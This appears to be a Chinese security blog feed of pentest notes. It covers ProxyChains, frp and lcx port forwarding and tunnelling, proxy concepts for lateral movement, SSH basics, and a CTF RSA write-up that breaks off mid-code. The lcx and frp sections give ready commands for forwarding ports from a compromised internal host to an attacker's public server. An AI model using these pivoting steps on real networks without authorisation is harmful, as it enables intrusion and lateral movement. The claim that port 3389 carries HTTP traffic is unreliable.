        <content type="html"><![CDATA[<h2 id="ProxyChains介绍"><a href="#ProxyChains介绍" class="headerlink" title="ProxyChains介绍"></a>ProxyChains介绍</h2><p>ProxyChains遵循GNU协议的一款适用于linux系统的网络代理设置工具。强制由任一程序发起的TCP连接请求必须通过诸如TOR 或 SOCKS4, SOCKS5 或HTTP(S) 代理。支持的认证方式包括：SOCKS4&#x2F;5的用户&#x2F;密码认证，HTTP的基本认证。允许TCP和DNS通过代理隧道，并且可配置多个代理。</p><p>在以下几种场合，你可以考虑使用ProxyChains：需要通过代理上网，或者需要突破诸如设置了端口限制的防火墙；或者要使用telnet，ssh，wget，vnc，apt，ftp，nmap等应用；事实上，甚至可以通过ProxyChains设置反向代理来让你能够从外部访问你的内部局域网。突破防火墙限制访问互联网。</p><h2 id="ProxyChains的安装"><a href="#ProxyChains的安装" class="headerlink" title="ProxyChains的安装"></a>ProxyChains的安装</h2><p>以kali为例</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#编译安装</span><span class="token function">git</span> clone https://github.com/rofl0r/proxychains-ng<span class="token builtin class-name">cd</span> proxychains-ng./configure<span class="token function">sudo</span> <span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span><span class="token comment">#apt命令安全</span><span class="token function">apt-get</span> <span class="token function">install</span> proxychains <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>配置文件位于 &#x2F;etc&#x2F;proxychains.conf ，打开后你需要在末尾添加你使用的代理 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/proxychains.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在下面配置你代理的模式以及端口</p><p><img src="/2023/07/26/proxychains/image-20230726170100523.png" alt="image-20230726170100523"></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>使用的时候直接在前面加上proxychains就可以</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 <span class="token function">curl</span> cip.ccproxychains4 <span class="token function">curl</span> google.comproxychains4 <span class="token function">apt-get</span> update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是像</p><pre class="line-numbers language-none"><code class="language-none">proxychains ping google.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就不太行，因为proxychains只能代理TCP，而ping是ICMP</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> proxychains </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frp</title>
      <link href="/2023/07/26/frp/"/>
      <url>/2023/07/26/frp/</url>
      
        <content type="html"><![CDATA[<h2 id="frp初识"><a href="#frp初识" class="headerlink" title="frp初识"></a>frp初识</h2><p>frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议，且支持 P2P 通信。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>frp项目地址：<a href="https://github.com/fatedier/frp/">https://github.com/fatedier/frp/</a></p><p>根据自己的系统在releases里下载对应的版本，下载之后解亚就行了。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>官方文档：<a href="https://gofrp.org/docs/">https://gofrp.org/docs/</a></p><p>首先需要一台vps，和一台客户机</p><p>这里vps 192.168.1.129</p><p>目标机  10.168.121.33</p><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><h4 id="配置开启frps"><a href="#配置开启frps" class="headerlink" title="配置开启frps"></a>配置开启frps</h4><p>首先配置服务端配置文件 frps.ini</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>bind_port <span class="token operator">=</span> <span class="token number">7000</span><span class="token assign-left variable">token</span><span class="token operator">=</span>shadow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后开启frp服务端</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./frps <span class="token parameter variable">-c</span> frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/07/26/frp/image-20230726144239518.png" alt="image-20230726144239518"></p><h4 id="配置开启frpc"><a href="#配置开启frpc" class="headerlink" title="配置开启frpc"></a>配置开启frpc</h4><p>首先还是修改配置文件frpc.ini</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>common<span class="token punctuation">]</span><span class="token comment">#vps_ip</span>server_addr <span class="token operator">=</span> <span class="token number">192.168</span>.1.129server_port <span class="token operator">=</span> <span class="token number">7000</span><span class="token assign-left variable">token</span><span class="token operator">=</span>shadow<span class="token punctuation">[</span>ssh<span class="token punctuation">]</span><span class="token builtin class-name">type</span> <span class="token operator">=</span> tcplocal_ip <span class="token operator">=</span> <span class="token number">127.0</span>.0.1local_port <span class="token operator">=</span> <span class="token number">22</span>remote_port <span class="token operator">=</span> <span class="token number">6000</span><span class="token punctuation">[</span>rdp<span class="token punctuation">]</span><span class="token assign-left variable">type</span><span class="token operator">=</span>tcplocal_ip <span class="token operator">=</span> <span class="token number">127.0</span>.0.1local_port <span class="token operator">=</span> <span class="token number">3389</span>remote_port <span class="token operator">=</span> <span class="token number">3389</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ssh,rdp就相当于把本地的22端口映射到vps的6000，把本地3389映射到vps3389</p><p>开启frp客户端</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.<span class="token punctuation">\</span>frpc.exe <span class="token parameter variable">-c</span> frpc.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功连接之后，就把本地的22端口映射到vps的6000，把本地3389映射到vps3389，在VPS访问3389、6000就能访问到内网机器的3389，22端口</p><h3 id="socks代理"><a href="#socks代理" class="headerlink" title="socks代理"></a>socks代理</h3><h4 id="配置开启frps-1"><a href="#配置开启frps-1" class="headerlink" title="配置开启frps"></a>配置开启frps</h4><p>内网主机可出网，想把要内网主机作为跳板机使用这时就可以使用frp搭建socks代理</p><p>我们可以加一些账号密码验证</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>bind_port <span class="token operator">=</span> <span class="token number">7000</span>token token <span class="token operator">=</span> shadowdashboard_port <span class="token operator">=</span> <span class="token number">8000</span> dashboard_user <span class="token operator">=</span> admin <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后启动服务端</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">frps <span class="token parameter variable">-c</span> frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="配置开启frpc-1"><a href="#配置开启frpc-1" class="headerlink" title="配置开启frpc"></a>配置开启frpc</h4><p>配置frpc.ini</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>server_addr <span class="token operator">=</span> <span class="token number">192.168</span>.1.129server_port <span class="token operator">=</span> <span class="token number">7000</span><span class="token comment"># 客户端认证 token，需要和服务端 token 保持一致 </span>token <span class="token operator">=</span> shadow<span class="token comment"># 启用加密，防止流量被拦截 </span>use_encryption <span class="token operator">=</span> <span class="token boolean">true</span> <span class="token comment"># 启用压缩，提升流量转发速度 </span>use_compression <span class="token operator">=</span> <span class="token boolean">true</span> <span class="token punctuation">[</span>socks5<span class="token punctuation">]</span> <span class="token builtin class-name">type</span> <span class="token operator">=</span> tcp <span class="token comment"># 连接 vps 的端口 </span>remote_port <span class="token operator">=</span> <span class="token number">1080</span> plugin <span class="token operator">=</span> socks5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开启客户端</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./frpc.exe <span class="token parameter variable">-c</span> frpc.ini <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样socks5代理就配置好了</p><p>下面几篇文章更加详细</p><p><a href="https://blog.csdn.net/include_voidmain/article/details/123254817">https://blog.csdn.net/include_voidmain/article/details/123254817</a></p><p><a href="https://blog.csdn.net/qingan6/article/details/130705151">https://blog.csdn.net/qingan6/article/details/130705151</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lcx</title>
      <link href="/2023/07/26/lcx/"/>
      <url>/2023/07/26/lcx/</url>
      
        <content type="html"><![CDATA[<h2 id="3389端口"><a href="#3389端口" class="headerlink" title="3389端口"></a>3389端口</h2><p>3389端口是指远程桌面协议（RDP）使用的TCP端口。RDP是一种用于远程控制Windows电脑的协议。通过3389端口，用户可以从任何地方使用远程桌面协议连接到目标Windows计算机。这意味着用户可以在不同的设备上远程访问另一个Windows操作系统，就好像在使用本地机器一样。</p><p>3389端口的主要用途是通过RDP实现远程控制。通过该端口，用户可以可视化地访问远程计算机的桌面、文件系统和其他相关功能。</p><p>除了用于RDP外，3389端口还可以用于其他网络通信，例如网络浏览器的HTTP数据流量。</p><h2 id="lcx介绍"><a href="#lcx介绍" class="headerlink" title="lcx介绍"></a>lcx介绍</h2><p>lcx有windows版和linux版两个版本，这两个版本的lcx都具有三个功能：</p><p>监听；转发；端口转向。</p><p>在使用lcx时必须保证两个前提，肉鸡A和攻击机C都能够访问到外网机B；listen监听的端口之前不能被其它程序占用。Linux版的使用与Windows版大同小异，都是先在外网机B进行监听，之后在肉鸡A进行转发，然后在攻击机C进行访问。</p><p>不同的是，在转发过程中，Windows版的转发命令”-slave”命令后紧接的是外网机B的ip和端口号，然后再跟肉鸡A的ip和端口号，形如：lcx -slave IP(B) Port(B) IP(A) port(A)；而linux版的对应的转发命令形如： .&#x2F;portmap -m 3 – h1 IP(A) -p1 port(A) -h2 IP(B) -p2 port(B)。portmap为自己编译源文件生成的文件名。linux版的method 2对应的windows版的listen功能，即监听功能，method 1对应的是tran功能，即端口转向功能。我们常用到的是listen功能和转发功能slave。</p><h2 id="lcx使用"><a href="#lcx使用" class="headerlink" title="lcx使用"></a>lcx使用</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">内网失陷主机lcx.exe <span class="token parameter variable">-slave</span> rhost rport lhost lport公网代理主机lcx.exe <span class="token parameter variable">-listen</span> lport1 lport2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">内网失陷主机 ./portmap <span class="token parameter variable">-m</span> <span class="token number">3</span> <span class="token parameter variable">-h1</span> <span class="token number">127.0</span>.0.1 <span class="token parameter variable">-p1</span> <span class="token number">22</span> <span class="token parameter variable">-h2</span> <span class="token operator">&lt;</span>公网主机 IP<span class="token operator">></span> <span class="token parameter variable">-p2</span> <span class="token number">4444</span> 公网代理主机 ./portmap <span class="token parameter variable">-m</span> <span class="token number">2</span> <span class="token parameter variable">-p1</span> <span class="token number">4444</span> <span class="token parameter variable">-h2</span> <span class="token operator">&lt;</span>公网主机 IP<span class="token operator">></span> <span class="token parameter variable">-p2</span> <span class="token number">5555</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lcx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代理</title>
      <link href="/2023/07/26/%E4%BB%A3%E7%90%86/"/>
      <url>/2023/07/26/%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="初识代理"><a href="#初识代理" class="headerlink" title="初识代理"></a>初识代理</h2><p>​       所谓代理服务器，是一个“中间人”的角色，在你和服务器之间传递数据。相当大比例的代理服务器可以以网站的形式存在，你只需打开代理服务器的网站，然后输入你希望访问的链接，就可以像平时浏览网页一样操作了。代理的工作原理是：由代理服务器自己去访问你的目标网站，并加载它的内容，然后再把这些加载过的内容传递到你的窗口上。这样就相当于你在浏览目标网站了。因此代理经常被叫做“梯子”或者“桥”。使用代理的好处是，你不需要直接链接到目标网站，因此目标网站就无法获取你的IP地址，取而代之获取的是代理服务器的IP地址。这样你就可以隐藏你的位置信息了。 当你访问大多数代理服务的时候，他们通常会要求你选择一个代理服务器所在的国家。你可以通过对应国家的代理服务器访问目标网站，这样目标网站就会认为你是在对应国家进行访问的。 比如，如果你想要访问的网站屏蔽了你所在的国家，那么你可以用代理服务器换上其他国家的IP，只要代理服务器所在的位置不在屏蔽范围之内，你就可以通过代理服务器实现访问了。</p><h2 id="代理的形式"><a href="#代理的形式" class="headerlink" title="代理的形式"></a>代理的形式</h2><p>代理有两种形式，映射和转发，最终的表现形式均为代理</p><p>端口映射：外网主机A想访问内网主机B上的服务</p><p>端口转发：外网主机A已经可以访问内网主机B里的任意端口，但是无法访问内网主机C上的端口，此时可以将C主机的端口转发到主机B端口，那么外网主机A访问了内网主机B就等于访问了内网主机C。</p><h2 id="正向代理和反向代理"><a href="#正向代理和反向代理" class="headerlink" title="正向代理和反向代理"></a>正向代理和反向代理</h2><h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p>正向代理是一个位于客户端和目标服务器之间的代理服务器（中间服务器）。为了从目标服务器取得内容，客户端向代理服务器发送一个请求，并且指定目标服务器，之后代理向目标服务器转发请求，将获得的内容返回给客户端。</p><p>正向代理的情况下，客户端必须要进行一些特殊的设置才能使用。</p><p>正向代理需要主动设置代理服务器 ip 或者域名进行访问，由设置的服务器 ip 或者域名去访问内容并返回</p><p>正向代理是代理客户端，为客户端收发请求，使真实客户端对服务器不可见。</p><p><img src="/2023/07/26/%E4%BB%A3%E7%90%86/image-20230721100544035.png" alt="image-20230721100544035"></p><p><img src="/2023/07/26/%E4%BB%A3%E7%90%86/image-20230721100822837.png" alt="image-20230721100822837"></p><p>正向代理的作用</p><p>1.突破访问限制：通过代理服务器，可以突破自身IP访问限制，访问国外网站，教育网等。</p><p>2.提高访问速度：通常代理服务器都设置一个较大的硬盘缓冲区，会将部分请求的响应保存到缓冲区中，当其他用户再访问相同的信息时， 则直接由缓冲区中取出信息，传给用户，以提高访问速度。</p><p>3.隐藏客户端真实IP：上网者也可以通过这种方法隐藏自己的IP，免受攻击。</p><h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>反向代理是指以代理服务器来接收客户端的请求，然后将请求转发给内部网络上的服务器，将从服务器上得到的结果返回给客户端，此时代理服务器对外表现为一个反向代理服务器。</p><p>对于客户端来说，反向代理就相当于目标服务器，只需要将反向代理当作目标服务器一样发送请求就可以了，并且客户端不需要进行任何设置。</p><p>正向代理需要配置代理服务器，而反向代理不需要做任何设置。</p><p>反向代理是代理服务器，为服务器收发请求，使真实服务器对客户端不可见。<br><img src="/2023/07/26/%E4%BB%A3%E7%90%86/image-20230721101701867.png" alt="image-20230721101701867"></p><p><img src="/2023/07/26/%E4%BB%A3%E7%90%86/image-20230721101727123.png" alt="image-20230721101727123"></p><p>反向代理作用</p><p>1.隐藏服务器真实IP：使用反向代理，可以对客户端隐藏服务器的IP地址。</p><p>2.负载均衡：反向代理服务器可以做负载均衡，根据所有真实服务器的负载情况，将客户端请求分发到不同 的真实服务器上。</p><p>3.提高访问速度：反向代理服务器可以对于静态内容及短时间内有大量访问请求的动态内容提供缓存服务， 提高访问速度。</p><p>4.提供安全保障：反向代理服务器可以作为应用层防火墙，为网站提供对基于Web的攻击行为（例如DoS&#x2F;DDoS）的防护，更容易排查恶意软件等。还可以为后端服务器统一提供加密和SSL加速（如SSL终端代理），提供HTTP访问认证等。</p><h2 id="内网渗透中代理的作用"><a href="#内网渗透中代理的作用" class="headerlink" title="内网渗透中代理的作用"></a>内网渗透中代理的作用</h2><p>在内网渗透中，往往是通过拿下Web服务器的权限，再通过Web服务器做一个跳板来做横向渗透。</p><p>我们知道在我们拿下的Web的服务器上做一些横向渗透是有点困难的，因为在Web这台机器上没有我们平常渗透常用的一些渗透工具，故横向渗透非常的困难，假如我们可以直接用我们自己的电脑做攻击机就可以让我们在渗透的过程中得心应手。</p><p>但是我们知道我们想要拿到的服务器在内网之中，我们无法通过互联网去直接访问它，这种时候我们又想控制它，我们就需要借助一些代理技术来辅助我们去完成直接控制内网机器的过程。</p><p>在进行横向移动时，需要依靠的是转发，而不是映射，但是这两个都可以做到内网穿透的作用。</p><p>参考链接：</p><p><a href="https://zhuanlan.zhihu.com/p/451193697">https://zhuanlan.zhihu.com/p/451193697</a></p><p><a href="https://blog.csdn.net/qq_46217803/article/details/125229535">https://blog.csdn.net/qq_46217803/article/details/125229535</a></p><p><a href="https://blog.csdn.net/weixin_52444045/article/details/126365366?ops_request_misc=&request_id=&biz_id=102&utm_term=proxychains%E6%98%AF%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E8%BF%98%E6%98%AF%E6%96%B9%E5%90%91%E4%BB%A3%E7%90%86&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-126365366.nonecase&spm=1018.2226.3001.4187">https://blog.csdn.net/weixin_52444045/article/details/126365366?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=proxychains%E6%98%AF%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E8%BF%98%E6%98%AF%E6%96%B9%E5%90%91%E4%BB%A3%E7%90%86&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-126365366.nonecase&amp;spm=1018.2226.3001.4187</a></p><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH</title>
      <link href="/2023/07/26/SSH/"/>
      <url>/2023/07/26/SSH/</url>
      
        <content type="html"><![CDATA[<h1 id="使用ssh连接远程主机"><a href="#使用ssh连接远程主机" class="headerlink" title="使用ssh连接远程主机"></a>使用ssh连接远程主机</h1><p>直接ssh 用户名@主机名参数（IPor域名）</p><pre class="line-numbers language-none"><code class="language-none">ssh user@hostname<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="ssh连接到其他端口"><a href="#ssh连接到其他端口" class="headerlink" title="ssh连接到其他端口"></a>ssh连接到其他端口</h1><p>ssh默认端口是22，我们可以通过-p设置</p><pre class="line-numbers language-none"><code class="language-none">ssh -p 6666 user@hostname<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="使用ssh在远程主机执行一条命令并显示到本地"><a href="#使用ssh在远程主机执行一条命令并显示到本地" class="headerlink" title="使用ssh在远程主机执行一条命令并显示到本地"></a>使用ssh在远程主机执行一条命令并显示到本地</h1><p>在连接命令的后面加上要执行的命令和 -l即可</p><pre class="line-numbers language-none"><code class="language-none">ssh user@hostname ls -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="在远程主机运行一个图形界面的程序"><a href="#在远程主机运行一个图形界面的程序" class="headerlink" title="在远程主机运行一个图形界面的程序"></a>在远程主机运行一个图形界面的程序</h1><pre class="line-numbers language-none"><code class="language-none">ssh -X user@hostname<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯全国精英赛2023</title>
      <link href="/2023/06/11/%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%85%A8%E5%9B%BD%E7%B2%BE%E8%8B%B1%E8%B5%9B2023/"/>
      <url>/2023/06/11/%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%85%A8%E5%9B%BD%E7%B2%BE%E8%8B%B1%E8%B5%9B2023/</url>
      
        <content type="html"><![CDATA[<h1 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h1><p><a href="https://blog.csdn.net/figfig55/article/details/127283671">https://blog.csdn.net/figfig55/article/details/127283671</a></p><p>连分数逼近data3，得到data1,data2</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#sage</span>data3 <span class="token operator">=</span> <span class="token number">1.42870767357206600351348423521722279489230609801270854618388981989800006431663026299563973511233193052826781891445323183272867949279044062899046090636843802841647378505716932999588</span>cf <span class="token operator">=</span> continued_fraction<span class="token punctuation">(</span>data3<span class="token punctuation">)</span>alist <span class="token operator">=</span> cf<span class="token punctuation">.</span>convergents<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> alist<span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span> <span class="token keyword">and</span> gcd<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">and</span> is_prime<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">and</span> is_prime<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">256</span> <span class="token keyword">and</span> <span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">256</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">data1&#x3D;97093002077798295469816641595207740909547364338742117628537014186754830773717data2&#x3D;67958620138887907577348085925738704755742144710390414146201367031822084270769<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>求p-q</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#sage</span>data1<span class="token operator">=</span><span class="token number">97093002077798295469816641595207740909547364338742117628537014186754830773717</span>data2<span class="token operator">=</span><span class="token number">67958620138887907577348085925738704755742144710390414146201367031822084270769</span>leak <span class="token operator">=</span> <span class="token number">1788304673303043190942544050868817075702755835824147546758319150900404422381464556691646064734057970741082481134856415792519944511689269134494804602878628</span>phi1 <span class="token operator">=</span> <span class="token punctuation">(</span>data1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>data2<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d1 <span class="token operator">=</span> inverse_mod<span class="token punctuation">(</span>data1<span class="token punctuation">,</span>phi1<span class="token punctuation">)</span>p_q <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>leak<span class="token punctuation">,</span>d1<span class="token punctuation">,</span>data1<span class="token operator">*</span>data2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>p_q<span class="token punctuation">)</span><span class="token comment">#p-q=57684649402353527014234479338961992571416462151551812296301705975419997474236</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后解方程求p,q,RSA求flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#python</span><span class="token keyword">import</span> sympy<span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>e<span class="token operator">=</span><span class="token number">65537</span>c<span class="token operator">=</span><span class="token number">1046004343125860480395943301139616023280829254329678654725863063418699889673392326217271296276757045957276728032702540618505554297509654550216963442542837</span>n<span class="token operator">=</span><span class="token number">2793178738709511429126579729911044441751735205348276931463015018726535495726108249975831474632698367036712812378242422538856745788208640706670735195762517</span>p_q<span class="token operator">=</span><span class="token number">57684649402353527014234479338961992571416462151551812296301705975419997474236</span>data2<span class="token operator">=</span><span class="token number">67958620138887907577348085925738704755742144710390414146201367031822084270769</span>p<span class="token operator">=</span>sympy<span class="token punctuation">.</span>Symbol<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span>q<span class="token operator">=</span>sympy<span class="token punctuation">.</span>Symbol<span class="token punctuation">(</span><span class="token string">'q'</span><span class="token punctuation">)</span>f1<span class="token operator">=</span>p<span class="token operator">*</span>q<span class="token operator">-</span>nf2<span class="token operator">=</span>p<span class="token operator">-</span>q<span class="token operator">-</span>p_qresult<span class="token operator">=</span>sympy<span class="token punctuation">.</span>solve<span class="token punctuation">(</span><span class="token punctuation">[</span>f1<span class="token punctuation">,</span>f2<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>p<span class="token punctuation">,</span>q<span class="token punctuation">]</span><span class="token punctuation">)</span>p<span class="token operator">=</span>result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>q<span class="token operator">=</span>result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>phi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>phi<span class="token punctuation">)</span><span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">-</span>data2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># SYC&#123;a00338c150aa3a5163dbf404100e6754&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="CrazyTreat"><a href="#CrazyTreat" class="headerlink" title="CrazyTreat"></a>CrazyTreat</h1><p>方法一：</p><p>参考3te✌的思路</p><p>首先根据高位攻击爆破还原p</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">n <span class="token operator">=</span> <span class="token number">12825979286271601683918945967807205713681672633015477696159535370583942888048057147306644638421752298716177752495337338096075416000876578271187444577819882839569779788443632687747140886774518365218964866144412523144471165524247882599528355994868389110054745818639473862141065572155619677445147335927188794120959</span>p4 <span class="token operator">=</span>  <span class="token number">13053422630763887754872929794631414002868675984142851995620494432706465523574529389771830464455212126838976863742628716168391373019631629866746550551576576</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> p4<span class="token operator">+</span>x    roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span 